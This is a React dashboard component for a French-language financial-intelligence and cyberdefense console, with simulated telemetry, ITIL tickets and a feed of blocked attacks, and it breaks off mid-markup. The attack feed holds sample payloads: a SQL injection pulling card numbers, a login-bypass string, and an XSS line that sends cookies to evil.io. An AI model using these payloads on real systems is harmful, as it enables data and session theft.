import React, { useState, useEffect } from 'react';
import { motion, Variants } from 'motion/react';
import {
  ShieldCheck,
  Lock,
  Server,
  Zap,
  AlertOctagon,
  Sparkles,
  Bot,
  ScrollText,
  Send,
  Play,
  Pause,
  Activity,
  ArrowUpRight,
  ChevronRight,
  Volume2,
  VolumeX,
  CreditCard,
  Network,
  Ban,
  CheckCircle,
  Clock,
  PlusCircle,
  FileText,
  Radio,
  Fingerprint,
  Download
} from 'lucide-react';
import { UserProfile, Channel, EncryptedMessage, ItsmTicket, AuditEntry, TicketStatus } from '../types';
import { formatSecondsToSla } from '../utils/sanitizer';
import { TokenBucketRateLimiter, RateLimitStatus } from '../utils/rateLimiter';
import { cyberAudio } from '../utils/audio';
import { SensitiveAction } from '../utils/webauthn';
import { SecurityHeatmap } from './SecurityHeatmap';
import { SecurityThreatAnalyzer } from './SecurityThreatAnalyzer';

interface BentoGridDashboardProps {
  currentUser: UserProfile;
  activeChannel: Channel;
  messages: EncryptedMessage[];
  tickets: ItsmTicket[];
  auditLogs: AuditEntry[];
  sessionKeyFingerprint: string;
  onSendMessage: (text: string) => void;
  onOpenOwaspModal: () => void;
  onOpenSpecsModal: () => void;
  onRunDiagnostic: (type: 'nkok' | 'keycloak' | 'minio' | 'kedb') => void;
  rateLimiter: TokenBucketRateLimiter;
  onSwitchToSplitView: () => void;
  onOpenNewTicket?: () => void;
  onEmergencyAlert48h?: () => void;
  onUpdateTicketStatus?: (ticketId: string, status: TicketStatus) => void;
  onResolveTicket?: (ticketId: string) => void;
  onOpenMegaPrompt?: (projectIdea?: string) => void;
  onOpenWebAuthn?: (action?: SensitiveAction) => void;
  onDownloadWormAudit?: () => void;
  onRateLimitBlocked?: () => void;
  onSimulateRepetitiveAttack?: (type: 'RATE_LIMIT' | 'UNAUTHORIZED') => void;
  wsStatus?: 'connected' | 'connecting' | 'disconnected' | 'reconnecting';
  wsLatencyMs?: number;
  onlineAgentsCount?: number;
}

interface SimulatedAttackEvent {
  id: string;
  type: string;
  sourceIp: string;
  payload: string;
  defense: string;
  timestamp: string;
}

export const BentoGridDashboard: React.FC<BentoGridDashboardProps> = ({
  currentUser,
  activeChannel,
  messages,
  tickets,
  auditLogs,
  sessionKeyFingerprint,
  onSendMessage,
  onOpenOwaspModal,
  onOpenSpecsModal,
  onRunDiagnostic,
  rateLimiter,
  onSwitchToSplitView,
  onOpenNewTicket,
  onEmergencyAlert48h,
  onUpdateTicketStatus,
  onResolveTicket,
  onOpenMegaPrompt,
  onOpenWebAuthn,
  onDownloadWormAudit,
  onRateLimitBlocked,
  onSimulateRepetitiveAttack,
  wsStatus = 'connected',
  wsLatencyMs = 6.2,
  onlineAgentsCount = 1
}) => {
  // Navigation interne au dashboard
  const [dashboardTab, setDashboardTab] = useState<'all' | 'intelligence' | 'cyber' | 'itsm'>('all');
  const [bentoInput, setBentoInput] = useState('');
  const [rateLimitStatus, setRateLimitStatus] = useState<RateLimitStatus>(rateLimiter.getStatus());
  const [isSimulatingLiveFlux, setIsSimulatingLiveFlux] = useState(true);
  const [liveLatency, setLiveLatency] = useState(7.8);
  const [packetRate, setPacketRate] = useState(1420);
  const [activeAttacksBlocked, setActiveAttacksBlocked] = useState(248);
  const [isMuted, setIsMuted] = useState(false);
  const [customIdeaInput, setCustomIdeaInput] = useState(
    "Plateforme d'Investigation Financière Souveraine (E2EE Zero-Knowledge + ITSM ITIL v4)"
  );
  const [forgeExported, setForgeExported] = useState(false);

  // Événements d'attaques simulées pour le centre de cyberdéfense
  const [attackFeed, setAttackFeed] = useState<SimulatedAttackEvent[]>([
    {
      id: 'ATK-901',
      type: 'SQL Injection',
      sourceIp: '185.220.101.42 (Tor Exit)',
      payload: "' UNION SELECT 1, cc_num, exp FROM accounts--",
      defense: 'Rejeté par Zod Schema & PostgreSQL RLS Enclave',
      timestamp: '13:04:12'
    },
    {
      id: 'ATK-902',
      type: 'Cross-Site Scripting (XSS)',
      sourceIp: '103.251.167.20',
      payload: '<img src=x onerror=fetch("https://evil.io/"+document.cookie)>',
      defense: 'Neutralisé par SafeTextSchema & CSP Strict',
      timestamp: '13:05:48'
    },
    {
      id: 'ATK-903',
      type: 'Brute-Force Auth API',
      sourceIp: '45.154.255.89',
      payload: '400 req/min sur /api/auth/fido2',
      defense: 'HTTP 429 Too Many Requests (Token Bucket)',
      timestamp: '13:06:33'
    }
  ]);

  // SLA P1 le plus critique
  const p1Ticket = tickets.find((t) => t.priorite === 'P1' && t.statut !== 'RESOLU');
  const p1Sla = p1Ticket ? formatSecondsToSla(p1Ticket.slaSecondesRestantes) : null;
  const isZeroKnowledgeBlocked = currentUser.roleNiveau === 3 && activeChannel.type === 'dos';

  // Toggle du son
  const toggleAudio = () => {
    const next = !isMuted;
    setIsMuted(next);
    cyberAudio.setMuted(next);
    if (!next) {
      cyberAudio.playTacticalClick();
    }
  };

  // Animation et fluctuation naturelle des métriques télémétriques
  useEffect(() => {
    if (!isSimulatingLiveFlux) return;
    const interval = setInterval(() => {
      setLiveLatency((prev) => +(prev + (Math.random() * 0.4 - 0.2)).toFixed(1));
      setPacketRate((prev) => Math.floor(prev + (Math.random() * 20 - 10)));
      if (Math.random() > 0.8) {
        setActiveAttacksBlocked((prev) => prev + 1);
      }
    }, 2000);
    return () => clearInterval(interval);
  }, [isSimulatingLiveFlux]);

  const handleQuickSend = () => {
    if (!bentoInput.trim()) return;
    cyberAudio.playCryptoBip();
    onSendMessage(bentoInput.trim());
    setBentoInput('');
  };

  const handleTestRateLimit = () => {
    const res = rateLimiter.consume(1);
    setRateLimitStatus(res);
    if (res.allowed) {
      cyberAudio.playTacticalClick();
    } else {
      cyberAudio.playShieldBlock();
      if (onRateLimitBlocked) {
        onRateLimitBlocked();
      }
    }
  };

  const handleSimulateAttack = () => {
    cyberAudio.playShieldBlock();
    setActiveAttacksBlocked((prev) => prev + 1);
    const newAtk: SimulatedAttackEvent = {
      id: `ATK-${Date.now().toString().slice(-3)}`,
      type: Math.random() > 0.5 ? 'Tentative SQLi Bypass' : 'Payload XSS Réflexif',
      sourceIp: `194.165.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
      payload: "admin' OR '1'='1' -- bypass-token",
      defense: 'Interception Immédiate WAF Nkok & Zero-Knowledge Buffer',
      timestamp: new Date().toLocaleTimeString().substring(0, 8)
    };
    setAttackFeed((prev) => [newAtk, ...prev.slice(0, 4)]);
  };

  const handleDiagnosticWithAudio = (type: 'nkok' | 'keycloak' | 'minio' | 'kedb') => {
    cyberAudio.playTacticalClick();
    onRunDiagnostic(type);
  };

  const handleEmergencyWithAudio = () => {
    cyberAudio.playAlertSiren();
    if (onEmergencyAlert48h) {
      onEmergencyAlert48h();
    }
  };

  const containerVariants: Variants = {
    hidden: { opacity: 0 },
    show: {
      opacity: 1,
      transition: {
        staggerChildren: 0.05
      }
    }
  };

  const cardVariants: Variants = {
    hidden: { opacity: 0, y: 15 },
    show: {
      opacity: 1,
      y: 0,
      transition: { duration: 0.35, ease: 'easeOut' }
    }
  };

  return (
    <div className="flex-1 overflow-y-auto p-4 sm:p-6 bg-[#070b14] font-sans text-slate-100 space-y-6 relative">
      {/* Halo lumineux d'ambiance cyberpunk */}
      <div className="absolute top-0 left-1/4 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />
      <div className="absolute top-1/3 right-10 w-96 h-96 bg-emerald-500/5 rounded-full blur-3xl pointer-events-none" />
      <div className="absolute bottom-10 left-1/3 w-96 h-96 bg-purple-500/5 rounded-full blur-3xl pointer-events-none" />

      {/* 1. Cockpit Header & Télémétrie en Direct */}
      <div className="relative z-10 flex flex-col lg:flex-row lg:items-center justify-between gap-4 backdrop-blur-xl bg-slate-900/50 p-4 rounded-2xl border border-slate-700/50 shadow-2xl">
        <div className="space-y-1">
          <div className="flex items-center space-x-2.5">
            <div className="flex items-center justify-center w-8 h-8 rounded-xl bg-gradient-to-tr from-cyan-600 to-emerald-600 text-white font-bold text-xs shadow-[0_0_15px_rgba(6,182,212,0.4)]">
              <Activity className="w-4 h-4 animate-pulse" />
            </div>
            <h2 className="text-lg sm:text-xl font-bold tracking-tight text-white flex items-center space-x-2">
              <span>Cockpit Souverain 360°</span>
              <span className="text-[10px] px-2 py-0.5 rounded-full bg-cyan-950/80 text-cyan-300 border border-cyan-800 font-mono font-semibold">
                BENTO GRID // HIGH-TELEMETRY
              </span>
            </h2>
          </div>
          <p className="text-xs text-slate-400">
            Hébergement Nkok Tier III • Décret d'Opposition 48h GAFI • Chiffrement Double Ratchet X25519 • Blindage OWASP Top 10
          </p>
        </div>

        {/* Widgets Métriques HUD et Sélecteurs de Vue */}
        <div className="flex flex-wrap items-center gap-2">
          {/* Jauge Télémétrie Live */}
          <div className="flex items-center space-x-3 bg-slate-950/90 border border-slate-800 px-3 py-1.5 rounded-xl font-mono text-xs">
            <div className="flex items-center space-x-1.5">
              <span className={`w-2 h-2 rounded-full ${isSimulatingLiveFlux ? 'bg-emerald-400 animate-ping' : 'bg-slate-600'}`} />
              <span className="text-slate-400">Flux Nkok :</span>
              <span className="text-emerald-400 font-bold tabular-nums">{liveLatency} ms</span>
            </div>
            <span className="text-slate-700">|</span>
            <div className="hidden sm:flex items-center space-x-1">
              <span className="text-slate-400">Débit :</span>
              <span className="text-cyan-400 font-bold tabular-nums">{packetRate} pkt/s</span>
            </div>
            <button
              onClick={() => {
                cyberAudio.playTacticalClick();
                setIsSimulatingLiveFlux(!isSimulatingLiveFlux);
              }}
              className="text-slate-400 hover:text-white p-0.5"
              title={isSimulatingLiveFlux ? 'Mettre en pause la télémétrie' : 'Reprendre la télémétrie'}
            >
              {isSimulatingLiveFlux ? <Pause className="w-3 h-3 text-amber-400" /> : <Play className="w-3 h-3 text-emerald-400" />}
            </button>
          </div>

          {/* Toggle Audio Tactile */}
          <button
            onClick={toggleAudio}
            className={`px-2.5 py-1.5 border rounded-xl text-xs font-mono flex items-center space-x-1.5 transition-all ${
              !isMuted
                ? 'bg-slate-950/80 text-emerald-300 border-emerald-800 shadow-[0_0_10px_rgba(16,185,129,0.2)]'
                : 'bg-slate-950/80 text-slate-500 border-slate-800'
            }`}
            title={isMuted ? 'Activer les sons tactiles de l\'interface' : 'Couper le son'}
          >
            {!isMuted ? <Volume2 className="w-3.5 h-3.5 text-emerald-400" /> : <VolumeX className="w-3.5 h-3.5" />}
            <span className="hidden sm:inline">{!isMuted ? 'Audio ON' : 'Muet'}</span>
          </button>

          {/* Bouton Matrice OWASP */}
          <button
            onClick={() => {
              cyberAudio.playTacticalClick();
              onOpenOwaspModal();
            }}
            className="px-3 py-1.5 bg-cyan-950/70 hover:bg-cyan-900/80 text-cyan-300 border border-cyan-700/80 rounded-xl text-xs font-mono font-bold flex items-center space-x-1.5 shadow-[0_0_15px_rgba(6,182,212,0.3)] transition-all"
          >
            <ShieldCheck className="w-3.5 h-3.5 text-cyan-400" />
            <span>Matrice OWASP</span>
          </button>

          {/* Bouton Biométrie WebAuthn */}
          {onOpenWebAuthn && (
            <button
              onClick={() => {
                cyberAudio.playTacticalClick();
                onOpenWebAuthn({
                  id: `webauthn-hud-${Date.now()}`,
                  type: 'REGISTER_AUTHENTICATOR',
                  title: 'Authentification Biométrique WebAuthn / FIDO2',
                  description: 'Autorisation forte locale via le W3C Credential Management API (Touch ID, Windows Hello, YubiKey).',
                  targetResource: currentUser.fingerprintFIDO,
                  severity: 'HAUTE'
                });
              }}
              className="px-3 py-1.5 bg-emerald-950/70 hover:bg-emerald-900/80 text-emerald-300 border border-emerald-700/80 rounded-xl text-xs font-mono font-bold flex items-center space-x-1.5 shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-all"
              title="Tester ou autoriser une signature WebAuthn biométrique"
            >
              <Fingerprint className="w-3.5 h-3.5 text-emerald-400" />
              <span>Biométrie WebAuthn</span>
            </button>
          )}

          {/* Bouton Split-Screen */}
          <button
            onClick={() => {
              cyberAudio.playTacticalClick();
              onSwitchToSplitView();
            }}
            className="px-3 py-1.5 bg-slate-800/80 hover:bg-slate-700 text-slate-200 border border-slate-700 rounded-xl text-xs font-mono transition-colors"
          >
            Vue Split-Screen
          </button>
        </div>
      </div>

      {/* 2. Onglets Filtres Bento Grid */}
      <div className="flex items-center space-x-2 overflow-x-auto pb-1 text-xs font-mono">
        <button
          onClick={() => {
            cyberAudio.playTacticalClick();
            setDashboardTab('all');
          }}
          className={`px-3 py-1.5 rounded-lg transition-all ${
            dashboardTab === 'all'
              ? 'bg-cyan-950 text-cyan-300 border border-cyan-700 font-bold shadow-[0_0_10px_rgba(6,182,212,0.25)]'
              : 'bg-slate-900/60 text-slate-400 hover:text-slate-200 border border-slate-800'
          }`}
        >
          Vue Globale 360°
        </button>
        <button
          onClick={() => {
            cyberAudio.playTacticalClick();
            setDashboardTab('intelligence');
          }}
          className={`px-3 py-1.5 rounded-lg transition-all ${
            dashboardTab === 'intelligence'
              ? 'bg-amber-950 text-amber-300 border border-amber-700 font-bold shadow-[0_0_10px_rgba(245,158,11,0.25)]'
              : 'bg-slate-900/60 text-slate-400 hover:text-slate-200 border border-slate-800'
          }`}
        >
          Renseignement Financier & Gels (1.45 Md FCFA)
        </button>
        <button
          onClick={() => {
            cyberAudio.playTacticalClick();
            setDashboardTab('cyber');
          }}
          className={`px-3 py-1.5 rounded-lg transition-all ${
            dashboardTab === 'cyber'
              ? 'bg-emerald-950 text-emerald-300 border border-emerald-700 font-bold shadow-[0_0_10px_rgba(16,185,129,0.25)]'
              : 'bg-slate-900/60 text-slate-400 hover:text-slate-200 border border-slate-800'
          }`}
        >
          Cybersécurité & Bouclier WAF
        </button>
        <button
          onClick={() => {
            cyberAudio.playTacticalClick();
            setDashboardTab('itsm');
          }}
          className={`px-3 py-1.5 rounded-lg transition-all ${
            dashboardTab === 'itsm'
              ? 'bg-purple-950 text-purple-300 border border-purple-700 font-bold shadow-[0_0_10px_rgba(139,92,246,0.25)]'
              : 'bg-slate-900/60 text-slate-400 hover:text-slate-200 border border-slate-800'
          }`}
        >
          Services ITIL v4 & Décret 48h
        </button>
      </div>

      {/* 3. Grille Principale Bento Grid */}
      <motion.div
        variants={containerVariants}
        initial="hidden"
        animate="show"
        className="grid grid-cols-12 gap-4 relative z-10"
      >
        {/* CARTE SPÉCIALE TAB INTELLIGENCE : Topologie du Circuit Financier Caviardé */}
        {dashboardTab === 'intelligence' && (
          <motion.div
            variants={cardVariants}
            className="col-span-12 backdrop-blur-2xl bg-slate-900/60 border border-amber-500/40 p-5 rounded-2xl shadow-2xl space-y-4"
          >
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
              <div className="flex items-center space-x-3">
                <div className="p-2.5 rounded-xl bg-amber-950/80 border border-amber-700/80 text-amber-400 shadow-[0_0_15px_rgba(245,158,11,0.3)]">
                  <Network className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-sm text-white tracking-wide">
                    Cartographie des Flux Financiers Suspects — Dossier #DOS-2026-441
                  </h3>
                  <span className="text-xs text-amber-300 font-mono">
                    Déclaration de Soupçon (DOS) Art. 29 GAFI // Opposition Conservatoire 48h
                  </span>
                </div>
              </div>
              <div className="flex items-center space-x-2">
                <span className="text-xs font-mono font-bold bg-amber-950 text-amber-300 border border-amber-800 px-3 py-1 rounded-full flex items-center space-x-1.5">
                  <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping" />
                  <span>SÉQUESTRE ACTIF : 1 450 000 000 FCFA</span>
                </span>
              </div>
            </div>

            {/* Schéma Interactif des Noeuds Financiers */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 font-mono text-xs">
              <div className="bg-slate-950/80 p-3.5 rounded-xl border border-slate-800 space-y-2">
                <div className="flex items-center justify-between text-slate-400 text-[11px]">
                  <span>1. Émetteur Initial</span>
                  <span className="text-red-400 font-bold">Origine Douteuse</span>
                </div>
                <div className="text-sm font-bold text-white">Société Écran "Equator Logistics"</div>
                <div className="text-[11px] text-slate-400">Compte CEMAC : GA039-40001-XXXX-42</div>
                <div className="p-1.5 rounded bg-red-950/50 border border-red-900 text-red-300 text-[10px]">
                  Tentative virement fractionné : 2 x 725 000 000 FCFA
                </div>
              </div>

              <div className="bg-slate-950/80 p-3.5 rounded-xl border border-amber-500/50 space-y-2 shadow-[0_0_15px_rgba(245,158,11,0.15)]">
                <div className="flex items-center justify-between text-slate-400 text-[11px]">
                  <span>2. Hub de Transit (Sous Séquestre)</span>
                  <span className="text-amber-400 font-bold">Bloqué ANIF</span>
                </div>
                <div className="text-sm font-bold text-amber-300">BGFIBank Libreville Siège</div>
                <div className="text-[11px] text-slate-300">Mandat d'arrêt des fonds : #DEC-48H-09</div>
                <div className="p-1.5 rounded bg-amber-950/50 border border-amber-900 text-amber-300 text-[10px]">
                  Décret d'opposition notifié au Directeur de la Conformité
                </div>
              </div>

              <div className="bg-slate-950/80 p-3.5 rounded-xl border border-slate-800 space-y-2">
                <div className="flex items-center justify-between text-slate-400 text-[11px]">
                  <span>3. Destination Prévue</span>
                  <span className="text-emerald-400 font-bold">GEL CONFIRMÉ</span>
                </div>
                <div className="text-sm font-bold text-white">Dubaï DMCC Offshore Holding</div>
                <div className="text-[11px] text-slate-400">Compte Ciblé : AE12-0330-XXXX-09</div>
                <div className="p-1.5 rounded bg-emerald-950/50 border border-emerald-900 text-emerald-300 text-[10px]">
                  Alerte transmise au FIU Émirats (Réseau Egmont)
                </div>
              </div>
            </div>

            <div className="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-slate-800 text-xs font-mono">
              <div className="text-slate-400">
                Opération supervisée par : <strong className="text-slate-200">{currentUser.nom}</strong> ({currentUser.matricule})
              </div>
              <div className="flex items-center space-x-2">
                <button
                  onClick={handleEmergencyWithAudio}
                  className="px-3 py-1.5 bg-red-950 hover:bg-red-900 text-red-200 border border-red-700 rounded-xl font-bold flex items-center space-x-1.5 transition-colors"
                >
                  <AlertOctagon className="w-3.5 h-3.5" />
                  <span>Déclencher Cellule Crise Parquet</span>
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* CARTE SPÉCIALE TAB CYBER : Radar d'Attaques & Simulation en Direct */}
        {dashboardTab === 'cyber' && (
          <motion.div
            variants={cardVariants}
            className="col-span-12 backdrop-blur-2xl bg-slate-900/60 border border-emerald-500/40 p-5 rounded-2xl shadow-2xl space-y-4"
          >
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
              <div className="flex items-center space-x-3">
                <div className="p-2.5 rounded-xl bg-emerald-950/80 border border-emerald-700/80 text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.3)]">
                  <ShieldCheck className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-sm text-white tracking-wide">
                    Centre de Cyberdéfense Souverain — WAF & Filtre Zod Temps Réel
                  </h3>
                  <span className="text-xs text-emerald-300 font-mono">
                    Interception Automatique OWASP Top 10 • Injections XSS/SQLi Neutralisées
                  </span>
                </div>
              </div>
              <button
                onClick={handleSimulateAttack}
                className="px-3.5 py-1.5 bg-emerald-900/60 hover:bg-emerald-800 text-emerald-200 border border-emerald-600 rounded-xl text-xs font-mono font-bold flex items-center space-x-2 transition-all shadow-[0_0_15px_rgba(16,185,129,0.2)]"
              >
                <Zap className="w-3.5 h-3.5 text-emerald-400" />
                <span>Simuler Cyber-Attaque Immédiate</span>
              </button>
            </div>

            {/* Flux des 3 dernières attaques bloquées */}
            <div className="space-y-2 font-mono text-xs">
              {attackFeed.map((atk) => (
                <div
                  key={atk.id}
                  className="p-3 bg-slate-950/80 rounded-xl border border-slate-800 flex flex-col md:flex-row md:items-center justify-between gap-2"
                >
                  <div className="space-y-0.5">
                    <div className="flex items-center space-x-2">
                      <span className="text-red-400 font-bold">{atk.type}</span>
                      <span className="text-slate-500">•</span>
                      <span className="text-slate-400">IP: {atk.sourceIp}</span>
                      <span className="text-slate-500">•</span>
                      <span className="text-slate-500">{atk.timestamp}</span>
                    </div>
                    <div className="text-slate-300 text-[11px] font-mono truncate max-w-xl">
                      Charge malveillante : <code className="text-amber-300">{atk.payload}</code>
                    </div>
                  </div>
                  <div className="px-2.5 py-1 bg-emerald-950/80 border border-emerald-800 text-emerald-300 rounded-lg text-[10px] font-bold shrink-0">
                    {atk.defense}
                  </div>
                </div>
              ))}
            </div>
          </motion.div>
        )}

        {/* CARTE SPÉCIALE TAB ITSM : Heatmap & Progression des Incidents ITIL v4 */}
        {dashboardTab === 'itsm' && (
          <motion.div
            variants={cardVariants}
            className="col-span-12 backdrop-blur-2xl bg-slate-900/60 border border-purple-500/40 p-5 rounded-2xl shadow-2xl space-y-4"
          >
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
              <div className="flex items-center space-x-3">
                <div className="p-2.5 rounded-xl bg-purple-950/80 border border-purple-700/80 text-purple-400 shadow-[0_0_15px_rgba(139,92,246,0.3)]">
                  <Clock className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-sm text-white tracking-wide">
                    Gestion des Incidents ITIL v4 & Suivi des Délais MTTA/MTTR
                  </h3>
                  <span className="text-xs text-purple-300 font-mono">
                    Service Desk ANIF • Matrice d'Escalade et Décompte Légal 48h
                  </span>
                </div>
              </div>
              {onOpenNewTicket && (
                <button
                  onClick={() => {
                    cyberAudio.playTacticalClick();
                    onOpenNewTicket();
                  }}
                  className="px-3.5 py-1.5 bg-purple-900/60 hover:bg-purple-800 text-purple-200 border border-purple-600 rounded-xl text-xs font-mono font-bold flex items-center space-x-2 transition-all shadow-[0_0_15px_rgba(139,92,246,0.2)]"
                >
                  <PlusCircle className="w-3.5 h-3.5 text-purple-300" />
                  <span>Nouvel Incident</span>
                </button>
              )}
            </div>

            {/* Tableau Interactif des Tickets */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 font-mono text-xs">
              {tickets.map((t) => {
                const sla = formatSecondsToSla(t.slaSecondesRestantes);
                return (
                  <div
                    key={t.id}
                    className="p-3.5 bg-slate-950/80 rounded-xl border border-slate-800 hover:border-purple-600/50 transition-colors space-y-2.5"
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-white">{t.id}</span>
                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                          t.priorite === 'P1'
                            ? 'bg-red-950 text-red-300 border border-red-800'
                            : t.priorite === 'P2'
                            ? 'bg-amber-950 text-amber-300 border border-amber-800'
                            : 'bg-blue-950 text-blue-300 border border-blue-800'
                        }`}
                      >
                        {t.priorite}
                      </span>
                    </div>

                    <div className="text-slate-300 text-xs line-clamp-2 font-sans font-medium">
                      {t.titre}
                    </div>

                    <div className="flex items-center justify-between text-[11px] pt-1 border-t border-slate-800/80">
                      <span className="text-slate-400">SLA Restant :</span>
                      <span className={`font-bold tabular-nums ${sla.isUrgent ? 'text-red-400 animate-pulse' : 'text-slate-200'}`}>
                        {sla.formatted}
                      </span>
                    </div>

                    <div className="flex items-center justify-between text-[10px]">
                      <span className="text-slate-500">Statut : {t.statut}</span>
                      {onUpdateTicketStatus && t.statut !== 'RESOLU' && (
                        <button
                          onClick={() => {
                            cyberAudio.playTacticalClick();
                            const next: TicketStatus = t.statut === 'NOUVEAU' ? 'ASSIGNE_L1' : 'RESOLU';
                            onUpdateTicketStatus(t.id, next);
                          }}
                          className="px-2 py-1 bg-purple-950 hover:bg-purple-900 text-purple-200 border border-purple-800 rounded font-bold"
                        >
                          {t.statut === 'NOUVEAU' ? 'Prendre en charge' : 'Résoudre (KEDB)'}
                        </button>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </motion.div>
        )}

        {/* CARTE 1 : Enclave Souveraine Nkok & HSM (col 12 -> 4) */}
        {(dashboardTab === 'all' || dashboardTab === 'cyber') && (
          <motion.div
            variants={cardVariants}
            whileHover={{ y: -2, transition: { duration: 0.15 } }}
            className="col-span-12 lg:col-span-4 backdrop-blur-2xl bg-slate-900/40 border border-slate-700/50 hover:border-cyan-500/50 p-4 rounded-2xl shadow-xl space-y-3 relative overflow-hidden transition-all group"
          >
            <div className="absolute -top-12 -right-12 w-32 h-32 bg-cyan-500/10 rounded-full blur-2xl pointer-events-none group-hover:bg-cyan-500/20 transition-all" />

            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2.5">
                <div className="p-2.5 rounded-xl bg-cyan-950/80 border border-cyan-800/80 text-cyan-400 shadow-[0_0_10px_rgba(6,182,212,0.3)]">
                  <Server className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-xs text-white uppercase tracking-wider">
                    Enclave Nkok Tier-III
                  </h3>
                  <span className="text-[10px] text-slate-400 font-mono">ZES Nkok // RPO = 0 synchrone</span>
                </div>
              </div>
              <div className="flex items-center space-x-1.5 text-emerald-400 text-[10px] font-mono font-bold bg-emerald-950/80 border border-emerald-800 px-2 py-0.5 rounded-full">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                <span>99.999% SLA</span>
              </div>
            </div>

            {/* Mini Oscilloscope SVG Temps Réel */}
            <div className="bg-slate-950/80 rounded-xl p-2.5 border border-slate-800 space-y-1">
              <div className="flex items-center justify-between text-[10px] font-mono text-slate-400">
                <span>Oscilloscope Débit Chiffré</span>
                <span className="text-cyan-400 font-bold">{packetRate} req/s</span>
              </div>
              <svg className="w-full h-10 text-cyan-400" viewBox="0 0 200 40">
                <path
                  d="M 0 20 Q 25 5, 50 20 T 100 20 T 150 20 T 200 20"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  className="animate-pulse"
                />
                <path
                  d="M 0 20 Q 25 35, 50 20 T 100 20 T 150 20 T 200 20"
                  fill="none"
                  stroke="rgba(6, 182, 212, 0.3)"
                  strokeWidth="1.5"
                />
              </svg>
            </div>

            <div className="grid grid-cols-2 gap-2 text-xs font-mono">
              <div className="bg-slate-950/70 p-2.5 rounded-xl border border-slate-800">
                <div className="text-[10px] text-slate-500">Latence Optique</div>
                <div className="text-base font-bold text-cyan-400 tabular-nums">{liveLatency} ms</div>
                <div className="text-[9px] text-slate-400">Libreville - Nkok</div>
              </div>
              <div className="bg-slate-950/70 p-2.5 rounded-xl border border-slate-800">
                <div className="text-[10px] text-slate-500">Sécurité Matérielle</div>
                <div className="text-base font-bold text-emerald-400">HSM FIPS 140-3</div>
                <div className="text-[9px] text-slate-400">Double Ratchet</div>
              </div>
            </div>

            <div className="text-[11px] font-mono text-slate-400 pt-1 flex items-center justify-between border-t border-slate-800/80">
              <span className="truncate">Session : <strong className="text-cyan-400">{sessionKeyFingerprint}</strong></span>
              <button
                onClick={() => {
                  cyberAudio.playTacticalClick();
                  onOpenSpecsModal();
                }}
                className="text-cyan-400 hover:underline flex items-center space-x-1 shrink-0 ml-2"
              >
                <span>Specs Go/K8s</span>
                <ArrowUpRight className="w-3 h-3" />
              </button>
            </div>
          </motion.div>
        )}

        {/* CARTE 2 : Bouclier OWASP & Rate Limiter Interactif (col 12 -> 4) */}
        {(dashboardTab === 'all' || dashboardTab === 'cyber') && (
          <motion.div
            variants={cardVariants}
            whileHover={{ y: -2, transition: { duration: 0.15 } }}
            className="col-span-12 lg:col-span-4 backdrop-blur-2xl bg-slate-900/40 border border-slate-700/50 hover:border-emerald-500/50 p-4 rounded-2xl shadow-xl space-y-3 relative overflow-hidden transition-all group"
          >
            <div className="absolute -top-12 -right-12 w-32 h-32 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none group-hover:bg-emerald-500/20 transition-all" />

            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2.5">
                <div className="p-2.5 rounded-xl bg-emerald-950/80 border border-emerald-800/80 text-emerald-400 shadow-[0_0_10px_rgba(16,185,129,0.3)]">
                  <Zap className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-xs text-white uppercase tracking-wider">
                    Bouclier OWASP & WAF
                  </h3>
                  <span className="text-[10px] text-slate-400 font-mono">DDoS, SQLi, XSS, CSRF</span>
                </div>
              </div>
              <div className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 font-bold">
                10/10 CONFORME
              </div>
            </div>

            {/* Jauge du Rate Limiter */}
            <div className="bg-slate-950/70 p-3 rounded-xl border border-slate-800 space-y-2">
              <div className="flex items-center justify-between text-[11px] font-mono">
                <span className="text-slate-400">Token Bucket (Rate Limit) :</span>
                <span className={`font-bold ${rateLimitStatus.allowed ? 'text-emerald-400' : 'text-red-400'}`}>
                  {rateLimitStatus.remainingTokens} / {rateLimitStatus.maxTokens} jetons
                </span>
              </div>
              <div className="w-full bg-slate-900 rounded-full h-2 overflow-hidden border border-slate-800">
                <div
                  className={`h-full transition-all duration-300 ${
                    rateLimitStatus.remainingTokens > 4 ? 'bg-emerald-400' : 'bg-red-500'
                  }`}
                  style={{ width: `${(rateLimitStatus.remainingTokens / rateLimitStatus.maxTokens) * 100}%` }}
                />
              </div>
              <div className="flex justify-between text-[10px] font-mono text-slate-500">
                <span>Attaques bloquées : {activeAttacksBlocked}</span>
                <span>Rechargement : 2 req/s</span>
              </div>
            </div>

            <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
              <div className="flex items-center gap-1.5">
                <button
                  onClick={handleTestRateLimit}
                  className="px-2.5 py-1.5 bg-emerald-900/60 hover:bg-emerald-800 text-emerald-200 border border-emerald-700/80 rounded-xl text-xs font-mono font-bold flex items-center space-x-1.5 transition-all shadow-[0_0_10px_rgba(16,185,129,0.2)] cursor-pointer"
                  title="Consommer 1 jeton Token Bucket pour tester la limitation"
                >
                  <Play className="w-3 h-3" />
                  <span>Tester Rafale Requete</span>
                </button>
